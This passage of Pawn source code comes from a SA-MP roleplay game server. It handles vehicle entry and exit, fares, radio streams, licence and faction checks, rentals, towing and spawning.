			    StopAudioStreamForPlayer(playerid);
			}
		}
		foreach(Player,i)
	    {
            if(IsPlayerInVehicle(i, vehicleid) && GetPlayerState(i) == 2 && TransportDuty[i] > 0)
            {
                if(GetPlayerCash(playerid) < TransportValue[i])
                {
                    format(string, sizeof(string), "* You need $%d to enter.", TransportValue[i]);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					RemovePlayerFromVehicle(playerid);
                }
                else
                {
                    if(TransportDuty[i] == 1)
                    {
                        format(string, sizeof(string), "* You paid $%d to the Taxi Driver.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Passenger %s has entered your Taxi.", name);
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
						TransportTime[i] = 1;
                    	TransportTime[playerid] = 1;
                    	TransportCost[playerid] = TransportValue[i];
                    	TransportCost[i] = TransportValue[i];
                    	TransportDriver[playerid] = i;
                    }
                    else if(TransportDuty[i] == 2)
                    {
                        format(string, sizeof(string), "* You paid $%d to the Bus Driver.", TransportValue[i]);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Passenger %s has entered your Bus.", name);
						SendClientMessage(i, COLOR_LIGHTBLUE, string);
                    }
					GivePlayerCash(playerid, - TransportValue[i]);
					TransportMoney[i] += TransportValue[i];
					Update(playerid, pCashx);
                }
			}
	    }
        new gun,tmp;
        GetPlayerWeaponData(playerid,5,gun,tmp);
        #pragma unused tmp
        if(gun)SetPlayerArmedWeapon(playerid,gun);
        else SetPlayerArmedWeapon(playerid,0);
	    return 1;
	}
    if(oldstate == PLAYER_STATE_DRIVER)
    {
        if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
		if((GetTickCount()-PlayerEnterTime[playerid]) < 220)
        {
			new anticar[300];
			format(anticar, sizeof(anticar), "{0000ff}[Anti-Cheat]:{FFFFFF} %s (%d, level %d) may be using vehicle teleport (Car Circle, Floating cars etc).",GetName(playerid),playerid,PlayerInfo[playerid][pLevel]);
        	ABroadCast(COLOR_RED,anticar,1);
		}
		return 1;
    }
	if(newstate == PLAYER_STATE_DRIVER)
	{
		if(vehRadio[vehicleid] > 0) MP3ON[playerid] = 0;
 		if(vehRadio[vehicleid] == 1)
   		{
   			StopAudioStreamForPlayer(playerid);
      		PlayAudioStreamForPlayer(playerid, "http://yp.shoutcast.com/sbin/tunein-station.pls?id=151778");
		}
		else if(vehRadio[vehicleid] == 2)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://stream.profm.ro:8012/profm.mp3");
		}
		else if(vehRadio[vehicleid] == 3)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://radiotaraf.no-ip.biz:7100");
		}
		else if(vehRadio[vehicleid] == 4)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://radiobandit.mine.nu:8000");
		}
		else if(vehRadio[vehicleid] == 5)
		{
			StopAudioStreamForPlayer(playerid);
   			PlayAudioStreamForPlayer(playerid, "http://radiohotstyle.dyndns.biz:8000");
		}
		else if(vehRadio[vehicleid] == 6)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://www.radiodiz.com/livediz.m3u");
		}
		else if(vehRadio[vehicleid] == 7)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://necenzurat.radiotequila.ro:7000");
		}
		else if(vehRadio[vehicleid] == 8)
		{
  			StopAudioStreamForPlayer(playerid);
     		PlayAudioStreamForPlayer(playerid, "http://89.34.24.40:9994/");
		}
		else if(vehRadio[vehicleid] > 8)
		{
  			StopAudioStreamForPlayer(playerid);
		}
		new newcar = GetPlayerVehicleID(playerid);
	    if(!IsABoat(newcar))
	    {
			PlayerEnterTime[playerid] = GetTickCount();
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		new engine,lights,alarm,doors,bonnet,boot,objective;
	    if(vehEngine[newcar] == 0)
	    {
			GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
		    SetVehicleParamsEx(newcar,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
		}
		else if(vehEngine[newcar] == 1)
		{
			GetVehicleParamsEx(newcar,engine,lights,alarm,doors,bonnet,boot,objective);
			SetVehicleParamsEx(newcar,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		}
		if(Gas[newcar] == 0)
		{
	        TogglePlayerControllable(playerid, 0);
	        NoFuel[playerid] = 1;
		}
		if(Trucker[playerid] >= 1)
		{
		    KillTimer(restruck[playerid]);
		}
		if(IsABoat(newcar))
		{
		    if(PlayerInfo[playerid][pBoatLic] < 1)
			{
                if(TakingLesson[playerid] == 2) { }
                else {
			    SendClientMessage(playerid,COLOR_GREY, "You don't have a boat license.");
			    RemovePlayerFromVehicle(playerid);
			    TogglePlayerControllable(playerid, 1); }
			}
		}
		else if(IsAPlane(newcar))
		{
		    if(PlayerInfo[playerid][pFlyLic] < 1)
			{
			    if(TakingLesson[playerid] == 2) { }
			    else {
			    SendClientMessage(playerid, COLOR_GREY, "You don't have a flying license.");
			    RemovePlayerFromVehicle(playerid);
				TogglePlayerControllable(playerid, 1); }
			}
		}
		else
		{
			if(PlayerInfo[playerid][pCarLic] < 1)
			{
			    if(IsABike(newcar) || IsAPlane(newcar) || GetVehicleModel(newcar) == 462) { }
			    else
			    {
					if(TakingLesson[playerid] == 1) { }
					else {
				 	SendClientMessage(playerid,COLOR_GREY, "You don't have a driving license.");
                    RemovePlayerFromVehicle(playerid);
                    TogglePlayerControllable(playerid, 1);
					SetTimerEx("UnFreezeStation", 500, 0, "i", playerid);
				  }
				}
			}
		}//Done with car check
		if(IsABike(newcar))
		{
            TogglePlayerControllable(playerid, 1);
            vehEngine[vehicleid] = 1;
            GetVehicleParamsEx(vehicleid,engine,lights,alarm,doors,bonnet,boot,objective);
		    SetVehicleParamsEx(vehicleid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
		}
		if(IsACopCar(newcar))
		{
		    if(IsACop(playerid) && OnDuty[playerid] == 1) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You Are Not On Duty. [ON DUTY]"); }
		}
		if(newcar == Copcar[6] || newcar == Copcar[7] || newcar == Copcar[18] || newcar == Copcar[19])
		{
		    if(IsACop(playerid))
		    {
		        if(OnDuty[playerid] == 1)
		        {
		        	if(PlayerInfo[playerid][pRank] < 3)
		        	{
		        		RemovePlayerFromVehicle(playerid);
		        		SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 3.");
		        	}
				}
				else
				{
				    SendClientMessage(playerid,COLOR_SERVER, "{999999}You Are Not On Duty. [ON DUTY]");
				}
			}
		}
		if(newcar == Copcar[1] || newcar == Copcar[2] || newcar == Copcar[3] || newcar == Copcar[14] || newcar == Copcar[29])
		{
		    if(IsACop(playerid))
		    {
		        if(OnDuty[playerid] == 1)
		        {
			        if(PlayerInfo[playerid][pRank] < 2)
			        {
			        	RemovePlayerFromVehicle(playerid);
			        	SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 2.");
			        }
		        }
				else
				{
				    SendClientMessage(playerid,COLOR_SERVER, "{999999}You Are Not On Duty. [ON DUTY]");
				}
			}
		}
		if(newcar == Copcar[30] || newcar == Copcar[19])
		{
		    if(IsACop(playerid))
		    {
		        if(OnDuty[playerid] == 1)
		        {
			        if(PlayerInfo[playerid][pRank] < 4)
			        {
			        	RemovePlayerFromVehicle(playerid);
			        	SendClientMessage(playerid,COLOR_SERVER, "{999999}You don't have rank 4.");
			        }
		        }
				else
				{
				    SendClientMessage(playerid,COLOR_SERVER, "{999999}You Are Not On Duty. [ON DUTY]");
				}
			}
		}
		if(IsAFbiCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsALVPDCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsASFPDCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop. !"); }
		}
		if(IsANgCar(newcar))
		{
		    if(IsACop(playerid)) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Cop."); }
		}
		else if(IsAnAmbulance(newcar))
		{
		    if(PlayerInfo[playerid][pMember] == 14) { }
		    else { RemovePlayerFromVehicle(playerid); SendClientMessage(playerid,COLOR_SERVER, "{999999}You are not a Paramedic.");}
		}
		if(IsAGarbageTruck(newcar))//garbagejob
		{
		    if(PlayerInfo[playerid][pJob] == 10)
			{
				SendClientMessage(playerid, COLOR_LIGHTBLUE, "INFO: You can collect rubbish for a pay check.");
				SendClientMessage(playerid, COLOR_SERVER, "INFO: Type /collect to get started");
			}
			else
			{
   				SendClientMessage(playerid, COLOR_SERVER, "You are not a Garbage Collector.");
			    RemovePlayerFromVehicle(playerid);
			    TogglePlayerControllable(playerid, 1);
			}
		}
		if(IsATruck(newcar))
		{
			if(PlayerInfo[playerid][pJob] == 14)
			{
			    if(Trucker2[playerid] == 0 && viddd[playerid] == 0)
		    	{
		    		Trucker2[playerid] = 1;
		    		SetPlayerCheckpoint(playerid,-54.6322,-1461.7084,6.8239,5.0);
		    		SendClientMessage(playerid, COLOR_SERVER, "{FEC3AC}Go to checkpoint to start work.");
		    		TruckID[playerid] = GetPlayerVehicleID(playerid);
				}
				return 1;
    		}
    		else
			{
   				SendClientMessage(playerid, COLOR_SERVER, "{999999}You are not a Trucker.");
			    RemovePlayerFromVehicle(playerid);
			    TogglePlayerControllable(playerid, 1);
			}
		}

		if(newcar == bus[1] || newcar == bus[2] || newcar == bus[3] || newcar == bus[4] || newcar == bus[5] || newcar == bus[6] || newcar == bus[7] || newcar == bus[8] || newcar == bus[9] || newcar == bus[10] || newcar == bus[11] || newcar == bus[12] || newcar == bus[13]
		|| newcar == bus[14] || newcar == bus[15] || newcar == bus[16])
		{
		    if(PlayerInfo[playerid][pJob] == 7)
			{
			    PlayerTextDrawShow(playerid, BusJob[playerid]);
			    format(string,sizeof(string),"~w~CHECKPOINTS: ~r~0~w~/~r~59");
				PlayerTextDrawSetString(playerid, BusCheck[playerid], string);
				PlayerTextDrawShow(playerid, BusCheck[playerid]);
				SendClientMessage(playerid, COLOR_SERVER, "Mergi la checkpoint.");
				busc[playerid] = 1;
				CheckBus[playerid] = 1;
				SetPlayerRaceCheckpoint(playerid, 0, 1693.2972,-2197.6602,13.4714,1941.3706,-2169.2083,13.4851,4.0);
			}
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Bus Driver.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == towcar[1] || newcar == towcar[2] || newcar == towcar[3] || newcar == towcar[4] || newcar == towcar[5])
		{
		    if(PlayerInfo[playerid][pJob] == 8) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a mechanic.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == taxic[1] || newcar == taxic[2] || newcar == taxic[3] || newcar == taxic[4] || newcar == taxic[5] || newcar == taxic[6] || newcar == taxic[7] || newcar == taxic[8] || newcar == taxic[9] || newcar == taxic[10])
		{
		    if(PlayerInfo[playerid][pMember] == 13||PlayerInfo[playerid][pLeader] == 13) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Santos Taxi member.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == taxic[6] || newcar == taxic[7])
		{
		    if(PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13)
		    {
				if(PlayerInfo[playerid][pRank] > 2) { }
			    else
				{
			        SendClientMessage(playerid,COLOR_SERVER,"{999999}You don't have rank 3.");
			        RemovePlayerFromVehicle(playerid);
			    }
			}
			else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Santos Taxi member or you don't have rank 3.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == Aztecasc[1] || newcar == Aztecasc[2] || newcar == Aztecasc[3] || newcar == Aztecasc[4] || newcar == Aztecasc[5] || newcar == Aztecasc[6] || newcar == Aztecasc[7] || newcar == Aztecasc[8] || newcar == Aztecasc[9] || newcar == Aztecasc[10] || newcar == Aztecasc[11]
		|| newcar == Aztecasc[12] || newcar == Aztecasc[13] || newcar == Aztecasc[14])
		{
		    if(PlayerInfo[playerid][pMember] == 4||PlayerInfo[playerid][pLeader] == 4) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Aztecas member.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
				if(newcar == Grovec[1] || newcar == Grovec[2] || newcar == Grovec[3] || newcar == Grovec[4] || newcar == Grovec[5] || newcar == Grovec[6] || newcar == Grovec[7] || newcar == Grovec[8] || newcar == Grovec[9] || newcar == Grovec[10] || newcar == Grovec[11] || newcar == Grovec[12] || newcar == Grovec[13]|| newcar == Grovec[14]|| newcar == Grovec[15]|| newcar == Grovec[16]|| newcar == Grovec[17]|| newcar == Grovec[18]|| newcar == Grovec[19]|| newcar == Grovec[20])
{
		    if(PlayerInfo[playerid][pMember] == 5||PlayerInfo[playerid][pLeader] == 5) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Grove Street member.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == Vagosc[1] || newcar == Vagosc[2] || newcar == Vagosc[3] || newcar == Vagosc[4] || newcar == Vagosc[5] || newcar == Vagosc[6]
		 || newcar == Vagosc[7] || newcar == Vagosc[8] || newcar == Vagosc[9] || newcar == Vagosc[10] || newcar == Vagosc[11])
		{
		    if(PlayerInfo[playerid][pMember] == 6||PlayerInfo[playerid][pLeader] == 6) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Los Vagos member.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == Ballasc[1] || newcar == Ballasc[2] || newcar == Ballasc[3] || newcar == Ballasc[4] || newcar == Ballasc[5] || newcar == Ballasc[6]
		 || newcar == Ballasc[7] || newcar == Ballasc[8] || newcar == Ballasc[9] || newcar == Ballasc[10] || newcar == Ballasc[11] || newcar == Ballasc[12] || newcar == Ballasc[13] || newcar == Ballasc[14])
		{
		    if(PlayerInfo[playerid][pMember] == 10||PlayerInfo[playerid][pLeader] == 10) { }
		    else
			{
		        SendClientMessage(playerid,COLOR_SERVER,"{999999}You are not a Ballas member.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == thea[1] || newcar == thea[2] || newcar == thea[3] || newcar == thea[4] || newcar == thea[5] || newcar == thea[6] || newcar == thea[7] || newcar == thea[8] || newcar == thea[9] || newcar == thea[10] || newcar == thea[11]
  		 || newcar == thea[12] || newcar == thea[13] || newcar == thea[14] || newcar == thea[15] || newcar == thea[16])
		{
		    if(PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Hitman.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == helpercars[1] || newcar == helpercars[2] || newcar == helpercars[3] || newcar == helpercars[4] || newcar == helpercars[5])
		{
		    if(PlayerInfo[playerid][pHelper] >= 1 && PlayerInfo[playerid][pHCar]) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Helper or you don't have unlock helper car.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == admincars[1] || newcar == admincars[2] || newcar == admincars[3] || newcar == admincars[4] || newcar == admincars[5])
		{
		    if(PlayerInfo[playerid][pAdmin] >= 1) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a Admin.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == si[1] || newcar == si[2] || newcar == si[3] || newcar == si[4] || newcar == si[5] || newcar == si[6] || newcar == si[7] || newcar == si[8] || newcar == si[9] || newcar == si[10] || newcar == si[11] || newcar == si[12] || newcar == si[13])
		{
		    if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12 || TakingLesson[playerid] == 2) { }
		    else
			{
		        SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a School Instructors or your don't have active leasson.");
		        RemovePlayerFromVehicle(playerid);
		    }
		}
		if(newcar == si[12] || newcar == si[13])
		{
		    if(PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12)
		    {
		        if(PlayerInfo[playerid][pRank] < 2)
		        {
		        	SendClientMessage(playerid, COLOR_SERVER,"{999999}You don't have rank 2.");
		        	RemovePlayerFromVehicle(playerid);
		        }
		    }
		}
		if(newcar == news[16] || newcar == news[17])
		{
		    if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9)
		    {
		        if(PlayerInfo[playerid][pRank] < 4)
		        {
		        	SendClientMessage(playerid, COLOR_SERVER,"{999999}You don't have rank 4.");
		        	RemovePlayerFromVehicle(playerid);
		        }
		    }
		}
		if(newcar == farm[1] || newcar == farm[2] || newcar == farm[3] || newcar == farm[4] || newcar == farm[5] || newcar == farm[6] || newcar == farm[7] || newcar == farm[8] || newcar == farm[9] || newcar == farm[10]
		|| newcar == farm[11] || newcar == farm[12] || newcar == farm[13])
		{
		    KillTimer(timerfarmm[playerid]);
		    if(AreFaina[playerid] < 1)
		    {
				if(PlayerInfo[playerid][pJob] == 6)
				{
					farmerc[playerid] = 1;
					farmertime[playerid] = 120;
					Gas[GetPlayerVehicleID(playerid)] = 100;
    			}
    			else
				{
   					SendClientMessage(playerid, COLOR_SERVER, "{999999}You are not a Farmer.");
			    	RemovePlayerFromVehicle(playerid);
			    	TogglePlayerControllable(playerid, 1);
			    	KillTimer(timerfarmm[playerid]);
				}
			}
			else
			{
			    SendClientMessage(playerid, COLOR_YELLOW, "Sell flour before working again.");
			    RemovePlayerFromVehicle(playerid);
		    	TogglePlayerControllable(playerid, 1);
		    	KillTimer(timerfarmm[playerid]);
			}
		}
		if(newcar == news[1] || newcar == news[2] || newcar == news[3] || newcar == news[4] || newcar == news[5] || newcar == news[6] || newcar == news[7] || newcar == news[8] || newcar == news[9] || newcar == news[10]
		|| newcar == news[11 || newcar == news[12]] || newcar == news[13] || newcar == news[14] || newcar == news[15] || newcar == news[16] || newcar == news[17])
		{
			if(PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9){ }
			else
			{
			    SendClientMessage(playerid, COLOR_SERVER,"{999999}You are not a News Reporter !");
			    RemovePlayerFromVehicle(playerid);
			}
		}
		if(newcar == rentls[1] || newcar == rentls[2] || newcar == rentls[3] || newcar == rentls[4] || newcar == rentls[5] || newcar == rentls[6] || newcar == rentls[7] || newcar == rentls[8] || newcar == rentls[9]
		|| newcar == rentlv[1] || newcar == rentlv[2] || newcar == rentlv[3] || newcar == rentlv[4] || newcar == rentlv[5] || newcar == rentlv[6] || newcar == rentlv[7] || newcar == rentlv[8] || newcar == rentlv[9] || newcar == rentlv[10] || newcar == rentlv[11] || newcar == rentlv[12]
		|| newcar == rentlv[13] || newcar == rentlv[14] || newcar == rentlv[15] || newcar == rentlv[16] || newcar == rentlv[17] || newcar == rentlv[18] || newcar == rentlv[19])
		{
			if(GetPlayerCash(playerid) < 20)
			{
				SendClientMessage(playerid, COLOR_SERVER,"You don't have enough money.");
			    RemovePlayerFromVehicle(playerid);
				return 1;
			}
			SendClientMessage(playerid, COLOR_SERVER, "Rented car. You pay $20/10 seconds that while using the machine.");
			SendClientMessage(playerid, COLOR_SERVER, "The car will respawn after 30 minutes if not used.");
			VehicleRent[newcar] = playerid;
			RentVeh[playerid] = newcar;
			RentTime[playerid] = 0;
			TotalTimeRent[playerid] = 0;
			PlayerTextDrawSetString(playerid, RentCar[playerid], "rentcar cost: ~g~$0");
			PlayerTextDrawShow(playerid, RentCar[playerid]);
			RentTimerr[playerid] = SetTimerEx("RentTimer", 1000, true, "i", playerid);
        }
		if(IsAnOwnableCar(newcar))
		{
			if(CarInfo[OwnedVeh(newcar)][cInsurancecar] == 0)
			{
					if(personalcar[0][playerid] == newcar || personalcar[1][playerid] == newcar || personalcar[2][playerid] == newcar || personalcar[3][playerid] == newcar || personalcar[4][playerid] == newcar || personalcar[5][playerid] == newcar
					||personalcar[6][playerid] == newcar || personalcar[7][playerid] == newcar || personalcar[8][playerid] == newcar || personalcar[9][playerid] == newcar)
					{
			   			format(string, sizeof(string), "Your vehicle has suffered damage and beacause you don't have insurance you have to pay $%s to fix.", FormatNumber(CarInfo[OwnedVeh(newcar)][cInscarprice]));
			   			ShowPlayerDialog(playerid, DIALOG_CARDAMAGE, DIALOG_STYLE_MSGBOX, "\n", string, "Pay", "Cancel");
   			  		}
   			  		else
   			  		{
						RemovePlayerFromVehicle(playerid);
						SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Can not drive this car until the owner pay the repairs.");
   			  		}
			}
    	}
	    if(IsAnOwnableCar(newcar))
		{
		    if(CarInfo[OwnedVeh(newcar)][cOwned] == 1)
		    {
				format(string,sizeof(string),"This %s (ID %d) is owned by %s | Age: %d days | Odometer: %.0f km | Insurance: $%d (%d points)",aVehicleNames[CarInfo[OwnedVeh(newcar)][cModel]-400],CarInfo[OwnedVeh(newcar)][cID],CarInfo[OwnedVeh(newcar)][cOwner],CarInfo[OwnedVeh(newcar)][cDays],CarInfo[OwnedVeh(newcar)][cKM],CarInfo[OwnedVeh(newcar)][cInscarprice],CarInfo[OwnedVeh(newcar)][cInsurancecar]);
				SendClientMessage(playerid, COLOR_WHITE, string);
			}
		}
		gLastCar[playerid] = newcar;
		gLastDriver[newcar] = playerid;
	}
	if(newstate == PLAYER_STATE_SPAWNED)
	{
		new Float: lwx, Float:lwy, Float:lwz;
		GetPlayerPos(playerid, lwx, lwy, lwz);
		if((lwz > 530.0 && PlayerInfo[playerid][pInt] == 0) || PlayerToPoint(1000.0, playerid, -1041.9,-1868.4,79.1)) //the highest land point in sa = 526.8
		{
			SetPlayerSpawn(playerid);
		}
		if(WantedPoints[playerid] > 0)
		{
		    PlayerInfo[playerid][pWantedDeaths] += 1;
		}
		if(PlayerInfo[playerid][pPremiumAccount] == 1)
		{
		    SetPlayerHealthEx(playerid, 100.0);
		}
		TelePos[playerid][0] = 0.0;
		TelePos[playerid][1] = 0.0;
		gPlayerSpawned[playerid] = 1;
		SafeTime[playerid] = 60;
	}
	return 1;
}

public CarCheck()
{
	new string[256];
	foreach(Player,j)
	{
	    if(IsPlayerConnected(j))
	    {
		    new Float:health;
		    GetPlayerHealthEx(j, health);
			SetPlayerHealthEx(j, health - 1.0);
			if(GetPlayerCash(j) < 0)
			{
			    if(MoneyMessage[j]==0)
			    {
				    format(string, sizeof(string), "You are in debt, you have till next Time Check to get: $%d or you go to jail.", GetPlayerCash(j));
					SendClientMessage(j, COLOR_ERROR, string);
					MoneyMessage[j] = 1;
				}
			}
			else
			{
			    MoneyMessage[j] = 0;
			}
		}
	}
	return 1;
}

public CarTow(carid)
{
	foreach(Player,i)
	{
		if(IsPlayerInVehicle(i, carid) && GetPlayerState(i) == PLAYER_STATE_DRIVER)
		{
			return 0;
		}
	}
	return 1;
}

public TowCar(car,car2,playerid)
{
    if(gPlayerLogged[playerid] == 1)
	{
    	new engine,lights,alarm,doors,bonnet,boot,objective;
		if(GetPlayerCash(playerid) > 5000)
		{
			if(CarTow(car))
			{
				GameTextForPlayer(playerid, "~r~CAR TOWED~n~~w~$-5000", 5000, 1);
				GivePlayerCash(playerid,-5000);
				RespawnPVeh(car,playerid);
				vehEngine[car] = 0;
				GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
				SetVehicleParamsEx(car,VEHICLE_PARAMS_OFF,lights,alarm,CarInfo[car2][cLock],bonnet,boot,objective);
				Update(playerid, pCashx);
			}
			else return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}Car is in use.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{FFB870}You don't have enough money.");
	}
	return 1;
}

public LocateCar(car,playerid)
{
    new Float:x,Float:y,Float:z,Float:xx,Float:yy,Float:zz,Float: distance,string[256];
	GetVehiclePos(car, x, y, z);
	GetPlayerPos(playerid, xx, yy, zz);
	SetPlayerCheckpoint(playerid, x, y, z, 4);
	gPlayerCheckpointStatus[playerid] = CHECKPOINT_LOCATE;
	distance = GetDistanceBetweenPoints(xx,yy,zz,x,y,z);
	format(string,sizeof(string),"Go to the red dot on the minimap to reach your car. Distance: %.0fm.",distance);
	SendClientMessage(playerid,COLOR_YELLOW,string);
	return 1;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{
	if(vehicleid == racingcar[playerid])
	{
		DisableRemoteVehicleCollisions(playerid, 0);
		DisablePlayerRaceCheckpoint(playerid);
		CP[playerid] = 0;
		SetVehicleVirtualWorld(racingcar[playerid], 0);
		DestroyVehicle(racingcar[playerid]);
		SetPlayerVirtualWorld(playerid, 0);
		TogglePlayerControllable(playerid, 1);
		racingcar[playerid] = -1;
		SetPlayerPos(playerid, 1154.4122,-1440.0548,15.7969);
	}
	foreach(Player, x)
	{
		if(vehicleid == personalcar[0][x])
		{
		    DespawnCar[x][0] = 600;
		}
		if(vehicleid == personalcar[1][x])
		{
		    DespawnCar[x][1] = 600;
		}
		if(vehicleid == personalcar[2][x])
		{
		    DespawnCar[x][2] = 600;
		}
		if(vehicleid == personalcar[3][x])
		{
		    DespawnCar[x][3] = 600;
		}
		if(vehicleid == personalcar[4][x])
		{
		    DespawnCar[x][4] = 600;
		}
		if(vehicleid == personalcar[5][x])
		{
		    DespawnCar[x][5] = 600;
		}
		if(vehicleid == personalcar[6][x])
		{
		    DespawnCar[x][6] = 600;
		}
		if(vehicleid == personalcar[7][x])
		{
		    DespawnCar[x][7] = 600;
		}
		if(vehicleid == personalcar[8][x])
		{
		    DespawnCar[x][8] = 600;
		}
		if(vehicleid == personalcar[9][x])
		{
		    DespawnCar[x][9] = 600;
		}
		if(vehicleid == personalcar[10][x])
		{
		    DespawnCar[x][10] = 600;
		}
		if(vehicleid == personalcar[11][x])
		{
		    DespawnCar[x][11] = 600;
		}
		if(vehicleid == personalcar[12][x])
		{
		    DespawnCar[x][12] = 600;
		}
		if(vehicleid == personalcar[13][x])
		{
		    DespawnCar[x][13] = 600;
		}
		if(vehicleid == personalcar[14][x])
		{
		    DespawnCar[x][14] = 600;
		}
	}
    if(MP3ON[playerid] == 0) StopAudioStreamForPlayer(playerid);
	Speedlimit[playerid] = 0;
    if(TakingLesson[playerid] == 1)
    {
        PlayerTextDrawHide(playerid, DMVexam[playerid]);
        PlayerTextDrawHide(playerid, DMVcheck[playerid]);
        TakingLesson[playerid] = 0;
	    DisablePlayerRaceCheckpoint(playerid);
        DestroyVehicle(examcar[playerid]);
		DisableRemoteVehicleCollisions(playerid, 0);
		examcar[playerid] = -1;
		SendClientMessage(playerid, COLOR_SERVER, "You failed the exam because you got out of the car.");
    }
    if(CP[playerid] == 34)
	{
	    TowAcc[playerid] = 1;
		new towedcar;
		towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
		SetVehicleToRespawn(towedcar);
		SetVehicleToRespawn(vehicleid);
		RemovePlayerFromVehicle(playerid);
   		CP[playerid] = 0;
	    DisablePlayerCheckpoint(playerid);
	    SetTimerEx("TowAgain", 120000, 0, "i", playerid);
	}
	if(busc[playerid] == 1)
	{
 		busc[playerid] = 0;
   		PlayerTextDrawHide(playerid, BusJob[playerid]);
   		PlayerTextDrawHide(playerid, BusCheck[playerid]);
   		SetVehicleToRespawn(vehicleid);
   		KillTimer(timerbus[playerid]);
   		DisablePlayerRaceCheckpoint(playerid);
		CheckBus[playerid] = 0;
		if(JobStep[playerid] >= 1)
  		{
    		JobStep[playerid] = 0;
	    	GivePlayerCash(playerid, -2000);
	    	SendClientMessage(playerid, COLOR_GREEN, "(-) You paid $2.000 the company buses duty.");
		}
	}
	if(IsAGarbageTruck(vehicleid) && IsCollectingRubbish[playerid] > 0)
	{
 		DisablePlayerCheckpoint(playerid);
 		PlayerInfo[playerid][pGarbageTime] = 0;
 		IsCollectingRubbish[playerid] = 0;
 		PlayerTextDrawHide(playerid, gunoierr[playerid]);
 		SetVehicleToRespawn(vehicleid);
	}
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	if(gPlayerLogged[playerid] == 1)
	{
		if(PlayerInfo[playerid][pMember] == 0 && PlayerInfo[playerid][pLeader] == 0 && PlayerInfo[playerid][pJailed] == 0)
		{
			new query[184];
            mysql_format(SQL,query, sizeof(query), "UPDATE users SET `Model`='%d' WHERE `name`='%s'",GetPlayerSkin(playerid),PlayerInfo[playerid][pNormalName]);
			mysql_tquery(SQL,query,"","");
		}
    }
	else
	{
		Kick(playerid);
		SendClientMessage(playerid, COLOR_RED2, "You are not logged in.");
	}
    return 1;
}

public OnPlayerRequestClass(playerid, classid)
{
	if(gPlayerLogged[playerid] == 1)
	{
		if(ChosenSkin[playerid] == 1) return SpawnPlayer(playerid);
	}
	if (RegistrationStep[playerid] == 0 && gPlayerLogged[playerid] != 1)
	{
